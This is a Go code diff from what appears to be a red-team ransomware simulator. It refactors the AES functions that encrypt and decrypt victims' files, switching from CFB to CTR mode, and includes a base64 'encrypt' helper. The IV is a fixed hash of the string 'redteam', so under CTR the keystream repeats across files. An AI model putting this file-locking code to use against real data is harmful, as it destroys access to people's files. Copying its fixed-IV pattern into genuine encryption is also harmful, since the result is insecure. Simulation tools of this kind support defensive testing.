@@ -45,7 +45,7 @@ var DefaultNotify = func() error {
 // AESDecrypt will return a function pointer to an EncryptFunc that
 // actually decrypts using the specified password.
 func AESDecrypt(passwd string) EncryptFunc {
-	return func(path string, b []byte) ([]byte, error) {
+	return func(_ string, b []byte) ([]byte, error) {
 		var block cipher.Block
 		var e error
 		var iv [sha256.Size]byte = sha256.Sum256([]byte("redteam"))
@@ -62,14 +62,14 @@ func AESDecrypt(passwd string) EncryptFunc {
 		}
 
 		// Ensure the file was encrypted with ransimware
-		for i := 0; i < aes.BlockSize; i++ {
+		for i := range aes.BlockSize {
 			if iv[i] != b[i] {
 				return b, nil
 			}
 		}
 		b = b[aes.BlockSize:]
 
-		stream = cipher.NewCFBDecrypter(block, iv[:aes.BlockSize])
+		stream = cipher.NewCTR(block, iv[:aes.BlockSize])
 		stream.XORKeyStream(b, b)
 
 		return b, nil
@@ -79,7 +79,7 @@ func AESDecrypt(passwd string) EncryptFunc {
 // AESEncrypt will return a function pointer to an EncryptFunc that
 // uses the specified password.
 func AESEncrypt(passwd string) EncryptFunc {
-	return func(path string, b []byte) ([]byte, error) {
+	return func(_ string, b []byte) ([]byte, error) {
 		var block cipher.Block
 		var ctxt []byte
 		var e error
@@ -93,11 +93,11 @@ func AESEncrypt(passwd string) EncryptFunc {
 		}
 
 		ctxt = make([]byte, aes.BlockSize+len(b))
-		for i := 0; i < aes.BlockSize; i++ {
+		for i := range aes.BlockSize {
 			ctxt[i] = iv[i]
 		}
 
-		stream = cipher.NewCFBEncrypter(block, iv[:aes.BlockSize])
+		stream = cipher.NewCTR(block, iv[:aes.BlockSize])
 		stream.XORKeyStream(ctxt[aes.BlockSize:], b)
 
 		return ctxt, nil
@@ -105,7 +105,7 @@ func AESEncrypt(passwd string) EncryptFunc {
 }
 
 // Base64Encode will "encrypt" using base64, obvs.
-func Base64Encode(path string, b []byte) ([]byte, error) {
+func Base64Encode(_ string, b []byte) ([]byte, error) {
 	return []byte(base64.StdEncoding.EncodeToString(b)), nil
 }
 
